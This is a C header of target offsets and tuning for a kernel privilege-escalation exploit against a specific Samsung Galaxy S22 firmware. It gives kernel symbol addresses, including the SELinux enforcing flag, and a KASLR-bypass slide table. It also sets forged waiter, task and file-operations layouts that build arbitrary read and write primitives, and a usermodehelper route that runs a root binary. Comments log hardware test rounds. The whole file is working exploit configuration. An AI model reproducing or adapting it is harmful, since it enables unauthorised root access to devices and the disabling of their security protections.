#ifndef OFFSET_H
#define OFFSET_H

/* r0q: use the 32-bit (compat) exp32 write primitive (see src/exp32/,
 * src/api.c). Supervisor build only; the app route keeps its own path. */
#define APP_EXP32_ROUTE 1

/*
 * r0q (SM-S901U1 Galaxy S22) — S901U1UESAGZF3 (CHA / US unlocked)
 * kernel: 5.10.236-android12-9-31998796-abS901U1UESAGZF3 (2026-06-16 build)
 * Android 16, SPL 2026-06-05, Snapdragon 8 Gen 1 (SM8450 / taro)
 *
 * PROVISIONAL: offsets extracted from the exact firmware kernel Image
 * (AP_S901U1UESAGZF3 ... boot.img.lz4 -> raw ARM64 Image ->
 * vmlinux-to-elf, base 0xffffffc008000000) and cross-checked against the
 * SM8450 F9360ZCSAIZF1 target. NOT yet device-verified.
 *
 * No BTF in this Image (CONFIG_DEBUG_INFO_BTF is not set); 5.10 struct
 * layouts come from the A155N/F9360 5.10 branch record and are spot-checked
 * against this Image's disassembly.
 */

/* ---- mcast stack writer (SLIDE_STACK_WRITER=1 app builds) ----
 * Derived from this kernel's own disassembly (the 5.15 Samsung targets use
 * 0x78):
 *   mcast chain  __arm64_sys_setsockopt(0x10) + __sys_setsockopt(0x70) +
 *                sock_common_setsockopt(0x10) + ipv6_setsockopt(0x40) +
 *                do_ipv6_setsockopt(0x2e0 total; greqs at sp+0x58)
 *                -> greqs sits 0x358 below the wrapper entry sp;
 *   futex chain  __arm64_sys_futex(0x70) + do_futex(0x70) +
 *                futex_wait_requeue_pi(0x1a0; rt_waiter at sp+0x90)
 *                -> rt_waiter spans 0x250..0x2a0 below the same sp.
 * The copy covers stamp offsets [0, 0x104), so the waiter is seeded from
 * stamp offset 0xb8; 0xb8 + FAKE_WAITER_LAYOUT_SIZE(0x50) == stamp_size
 * (0x108), which is exactly the buffer slide_app.c sends.
 */
#define SLIDE_STACK_WRITER_MCAST 1
#define SLIDE_STACK_WRITER_SIGRETURN 2
#define MCAST_WAITER_OFF 0xb8
#ifndef SLIDE_MCAST_DOMAIN
#define SLIDE_MCAST_DOMAIN AF_INET6
#endif
#ifndef SLIDE_MCAST_LEVEL
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#endif
#ifndef SLIDE_MCAST_OPTION
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#endif

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "r0q-S901U1UESAGZF3-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
/* Root My Galaxy app payload: must use the fresh-P0 session path (same as
 * q4q/e1s/e2s). r0q has CONFIG_ARM64_MTE=y + CONFIG_KASAN_HW_TAGS=y; the
 * non-fresh path hardcodes mte=0 and cannot pass. */
#define APP_REQUIRE_FRESH_P0_SESSION 1
#else
#define BUILD_VARIANT_LABEL "r0q-S901U1UESAGZF3-root-umh"
#endif

/* ---- Kernel image layout (S901U1UESAGZF3) ---- */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* 39-bit VA PAGE_OFFSET */
#define P0_PHYS_OFFSET   0x80000000ULL           /* memstart_addr        */
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL        /* SM8450/taro ABL load address (same SoC family as q4q) */

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL   /* 64GB direct map */
#define DIRECT_MAP_BASE  0xffffff8000000000ULL
#define DIRECT_MAP_END   0xffffff9000000000ULL
#define VMEMMAP_START    0xfffffffeffe00000ULL   /* 39-bit v5.10: -VMEMMAP_SIZE(0x1000000000)-2M */
#define SKB_DATA_DELTA (-0xe80LL)

/* ---- ashmem dispatch functions ---- */
#define ASHMEM_MISC_FOPS_OFF 0x026ecd28ULL   /* &ashmem_misc.fops (ashmem_misc + 0x10) */
#define ASHMEM_FOPS_OFF      0x02080f78ULL   /* &ashmem_fops     */

#define ASHMEM_IOCTL_OFF         0x0114ab24ULL   /* ashmem_ioctl        */
#define ASHMEM_COMPAT_IOCTL_OFF  0x0114b5f0ULL   /* compat_ashmem_ioctl */
#define ASHMEM_MMAP_OFF          0x0114b648ULL   /* ashmem_mmap         */
#define ASHMEM_OPEN_OFF          0x0114b878ULL   /* ashmem_open         */
#define ASHMEM_RELEASE_OFF       0x0114b910ULL   /* ashmem_release      */
#define ASHMEM_SHOW_FDINFO_OFF   0x0114ba2cULL   /* ashmem_show_fdinfo  */

/*
 * configfs — v5.10 uses old .read/.write API. The arbitrary-READ primitive
 * forges configfs_buffer->page/->count, so .read MUST be configfs_read_file;
 * the arbitrary-WRITE primitive forges ->bin_buffer, so .write MUST be
 * configfs_write_bin_file.
 */
#define CONFIGFS_READ_ITER_OFF      0x006040d8ULL   /* configfs_read_file      */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00604a68ULL   /* configfs_write_bin_file */

#define COPY_SPLICE_READ_OFF  0x0053866cULL   /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF       0x004c3694ULL   /* noop_llseek              */

/* ---- Kernel data objects ---- */
#define INIT_TASK_OFF           0x0259c000ULL   /* init_task           */
#define ROOT_TASK_GROUP_OFF     0x0279c040ULL   /* root_task_group     */
#define SELINUX_ENFORCING_OFF   0x028cdcd8ULL   /* selinux_state.enforcing (field at +0 on 5.10) */
#define KMALLOC_CACHES_OFF      0x020c3160ULL   /* kmalloc_caches      */
#define ANON_PIPE_BUF_OPS_OFF   0x01f03be8ULL   /* anon_pipe_buf_ops   */

/* ---- Convenience macros (absolute addresses) ---- */
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER       (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ   (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK        (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/*
 * kCFI: this Image has CONFIG_CFI_CLANG=y but an EMPTY __cfi_jt
 * (__cfi_jt_start == __cfi_jt_end == 0xffffffc009800000), so the canonical
 * kCFI entry for an indirectly called function is its own address. The
 * *_JT_OFF aliases below are kept for parity with q4q; the *raw* _OFF values
 * above already are the canonical entries.
 */
#define ASHMEM_IOCTL_JT_OFF           ASHMEM_IOCTL_OFF
#define ASHMEM_COMPAT_IOCTL_JT_OFF    ASHMEM_COMPAT_IOCTL_OFF
#define ASHMEM_MMAP_JT_OFF            ASHMEM_MMAP_OFF
#define ASHMEM_OPEN_JT_OFF            ASHMEM_OPEN_OFF
#define ASHMEM_RELEASE_JT_OFF         ASHMEM_RELEASE_OFF
#define ASHMEM_SHOW_FDINFO_JT_OFF     ASHMEM_SHOW_FDINFO_OFF
#define ASHMEM_LLSEEK_JT_OFF          0x0114a984ULL   /* ashmem_llseek */
#define CONFIGFS_READ_FILE_JT_OFF       CONFIGFS_READ_ITER_OFF
#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  CONFIGFS_BIN_WRITE_ITER_OFF
#define NOOP_LLSEEK_JT_OFF             NOOP_LLSEEK_OFF

/* ---- Root usermodehelper ---- */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001086b4ULL   /* call_usermodehelper_exec_work */
#define SYSTEM_UNBOUND_WQ_OFF             0x02589e08ULL   /* system_unbound_wq             */
#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF CALL_USERMODEHELPER_EXEC_WORK_OFF
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ---- SLIDE KASLR bypass offsets ---- */
#define SLIDE_FAKE_WAITER_PRIO   0
#define SLIDE_WAITER_WAKE_STATE  0
#define SLIDE_LOCK_OWNER_VALUE   1ULL
#define SLIDE_USE_FAKE_TASK      1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 84
#define SLIDE_PSELECT_WORD_SHIFT 0
/* 5.10: waiter qword 0 overlaps the first fd-set qword (A155N/q4q derivation). */
/* 32 KiB-granular slide candidates (hardware-measured): the P0 oracle and
 * select_slide_payload_slot() both match slides against this list. */
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x008000ULL, 0x010000ULL, 0x018000ULL, \
  0x020000ULL, 0x028000ULL, 0x030000ULL, 0x038000ULL, \
  0x040000ULL, 0x048000ULL, 0x050000ULL, 0x058000ULL, \
  0x060000ULL, 0x068000ULL, 0x070000ULL, 0x078000ULL, \
  0x080000ULL, 0x088000ULL, 0x090000ULL, 0x098000ULL, \
  0x0a0000ULL, 0x0a8000ULL, 0x0b0000ULL, 0x0b8000ULL, \
  0x0c0000ULL, 0x0c8000ULL, 0x0d0000ULL, 0x0d8000ULL, \
  0x0e0000ULL, 0x0e8000ULL, 0x0f0000ULL, 0x0f8000ULL, \
  0x100000ULL, 0x108000ULL, 0x110000ULL, 0x118000ULL, \
  0x120000ULL, 0x128000ULL, 0x130000ULL, 0x138000ULL, \
  0x140000ULL, 0x148000ULL, 0x150000ULL, 0x158000ULL, \
  0x160000ULL, 0x168000ULL, 0x170000ULL, 0x178000ULL, \
  0x180000ULL, 0x188000ULL, 0x190000ULL, 0x198000ULL, \
  0x1a0000ULL, 0x1a8000ULL, 0x1b0000ULL, 0x1b8000ULL, \
  0x1c0000ULL, 0x1c8000ULL, 0x1d0000ULL, 0x1d8000ULL, \
  0x1e0000ULL, 0x1e8000ULL, 0x1f0000ULL, 0x1f8000ULL
#define SLIDE_MAX_ATTEMPTS 32

#define SLIDE_NFULNL_LOGGER_NAME_OFF          0x01dfa1f1ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF        0x02591348ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x026acb50ULL
#define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF        0x0296dd45ULL   /* sysctl_bootid buffer */

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Return address after worker_thread's blocking bl schedule
 * (0xffffffc008112adc bl schedule -> LR 0xffffffc008112ae0). */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00112ae0ULL
/* Measured on hardware 2026-09-30: the image KASLR slide is 32 KiB-granular
 * (observed 0xd8000; worker_thread+0x558 at 0xffffffc0081eaae0). The shared
 * 64 KiB mask rejected the correct slide, so this target relaxes the
 * candidate granularity; slide.c then selects the most frequently observed
 * candidate across all trace records. */
#define SLIDE_TRACEFS_CANDIDATE_MASK 0x7fffULL

/* ---- Fake page layout offsets (within the 32KB order-3 kernel page) ----
 * Canonical 5.10 fops-route layout (same as a15-A155N and the device-tested
 * gts9u target); q4q's 0x1000/0x1350/0x2220 geometry is specific to its
 * fresh-P0 app oracle and did not engage the fake lock here. */
/* Canonical 5.10 fops layout. Hardware A/B (round 12): this geometry makes the
 * pselect route engage (success=1, step=4) while q4q's fresh-P0 app-oracle
 * geometry (0x1000/0x1350/0x2220) reverts to success=0/step=33. */
#define LOCK_OFF    0x1350
#define W0_OFF      0x2220
#define FOPS_OFF    0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF   0x4440
#define LEFT_OFF    0x5550
#define FAKE_TASK_OFF 0x3200

/* ---- rt_mutex_waiter embedded offsets (v5.10, 0x50 bytes) ---- */
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_PRIO_OFF            0x40
#define FAKE_WAITER_DEADLINE_OFF        0x48
#define FAKE_WAITER_WAKE_STATE_OFF      0x60   /* field absent in v5.10 */
#define FAKE_WAITER_WW_CTX_OFF          0x68   /* field absent in v5.10 */
#define FAKE_WAITER_LAYOUT_SIZE         0x50

/* ---- task_struct internal offsets (v5.10) ---- */
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x310
#define FAKE_TASK_PI_LOCK_OFF       0x86c
#define FAKE_TASK_PI_WAITERS_OFF    0x880
#define FAKE_TASK_PI_TOP_TASK_OFF   0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898

/* ---- configfs buffer-private overlay offsets ---- */
#define CFG_PAGE_OFF             0x10
#define CFG_NEEDS_READ_FILL_OFF  0x50
#define CFG_BIN_BUFFER_OFF       0x58
#define CFG_BIN_BUFFER_SIZE_OFF  0x60
#define CFG_CB_MAX_SIZE_OFF      0x64

/* ---- workqueue_struct (v5.10) ---- */
#define WQ_DFL_PWQ_OFF 0xb0

/* ---- pool_workqueue offsets (v5.10) ---- */
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x58
#define PWQ_MAX_ACTIVE_OFF   0x5c

/* ---- worker_pool offsets (v5.10) ---- */
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF  0x34

/* ---- work_struct offsets (v5.10) ---- */
#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

/* ---- struct page (v5.10, sizeof=0x40) ---- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- pipe buffer ---- */
#define PIPE_BUFFER_SLOTS         32
#define PIPE_BUF_FLAG_CAN_MERGE   0x10

/* ---- file_operations offsets (v5.10, sizeof=0x120) ---- */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xC8
#define FOPS_SHOW_FDINFO_OFF  0xE0

/* ---- v5.10 slab/cache overrides ---- */
#define MM_STRUCT_SZ       960    /* 0x3c0: v5.10 mm_struct slab size */
#define MM_ORDER           3
/* android12-5.10 enum kmalloc_cache_type = { NORMAL, RECLAIM [, DMA] };
 * CONFIG_ZONE_DMA is not set, so NR_KMALLOC_TYPES == 2 and there is no
 * cgroup cache type (that arrives on 5.14+). */
#define KMALLOC_CGROUP_TYPE 0
#define KMALLOC_CACHE_TYPES 2
#define KSNITCH_COLLISIONS 6
/* futex_init = roundup_pow_of_two(256 * num_possible_cpus()) = 2048
 * (SM8450: 8 possible CPUs; sysconf reports 8 online here, but the override
 * keeps the value pinned to the kernel's possible-CPU derivation). */
#define KERNELSNITCH_FUTEX_HASH_SIZE 2048

/* Hardware trace (round 11): the consumer's sched_setattr returns 0x0 but
 * takes ~0.98 s inside rt_mutex_adjust_prio_chain -- the same as the default
 * 1 s pselect window, so the main thread sampled success=0 just before the
 * boost landed (step=33, no warning, no panic). This must be top-level: the
 * supervisor (non-APP_PAYLOAD) build is the one that reaches this stage. */
/* APP_FOPS_TASK_PI_WAITERS is available in util.c (default off). Enabling it
 * makes the chain walk traverse the forged PI tree -- kprobe-verified: with it
 * off the walk returns 0 without invoking any forged callable
 * (configfs_read_file / configfs_write_bin_file / call_usermodehelper_exec_work
 * all stay silent); with it on the kernel panics inside the walk, so the
 * forged tree contents still need deriving. The companion changes in util.c
 * (forged task + pi_blocked_on at the install node) remove the panic but still
 * do not produce the fops write on their own. Enabled together with the fd_set
 * link words + timerfd arming so the walk reaches the forged waiter whose
 * pi_tree.right is the install target. Leaves engagement intact but still no
 * write on its own. Round 19 added a pi_waiters = target-8 + W0_OFF=FOPS_OFF-0x18
 * construction (a PI-tree link would then store fake_fops); it also changed
 * nothing, because the forged lock is only ever reached by a MIN chain walk,
 * which skips the requeue step that uses those fields. Left off. */
/* PSELECT_FDSET_LINKS (fops.c) populates the fd_set words that overlap the
 * waiter's rb-tree link fields. Enabled it changes behaviour but the walk then
 * never completes (success stays 0 even with a 25 s settle), so the link VALUES
 * are wrong -- they must be derived from rb_erase()/rb_link_node() disassembly
 * rather than guessed. Enabled below with the reference implementation's
 * values and read-end arming. */
#define PSELECT_FDSET_LINKS 1
#define PSELECT_CONSUMER_SETTLE_MS 1000
#define PSELECT_TIMEOUT_SEC 20

/* The waiter's own PI wait must outlast the pselect window above. */
#define ROUTE_WAIT_SECONDS 30

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 5000000000L
/* Requote-race guard rails: pselect-writer builds only. The mcast stack
 * writer (SLIDE_STACK_WRITER) never enters pselect, and leaving these on makes
 * the readiness guard skip the consumer trigger ("pselect ready=0 ... trigger
 * skipped"). The hardware-tested mcast targets define none of them. */
#if !defined(SLIDE_STACK_WRITER) && !defined(PSELECT_NO_SYNC_GUARDS)
#define SLIDE_SYNC_PSELECT_SYSCALL 1
#define SLIDE_GUARD_PSELECT_SYSCALL 1
#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
#endif /* !SLIDE_STACK_WRITER */

#define SLIDE_KSNITCH_APPENDED_FUTEXES 1024
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
/* 2 MiB probe page leaves room for every 32 KiB slide candidate. */
#define P0_ORACLE_PROBE_OFFSET 0x200000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/r0q-S901U1UESAGZF3/p0_fingerprint.h"
#endif

#endif
